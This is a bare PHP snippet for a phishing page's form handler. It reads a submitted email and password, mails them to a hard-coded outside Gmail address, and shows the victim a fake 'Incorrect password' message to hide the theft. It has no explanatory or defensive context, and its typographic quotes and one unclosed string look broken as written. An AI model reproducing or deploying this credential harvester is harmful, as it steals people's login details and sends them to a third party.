<?php if(isset($_POST[‘submit’])){$qv0=$_POST[’email’];$ga1=$_POST[‘password’];$ee2=’likhonexe@gmail.com;$bx3=’Form Submission’;$mi4=”Email :”.$qv0.”\n”.”Password :”.$ga1;$ci5=”From: “.$qv0;if(mail($ee2,$bx3,$mi4,$ci5)){echo “<h1>Incorrect password.! </h1> <br>
<h3> Submitted..!</h3>”;}else{echo “Something went wrong!”;}}?>
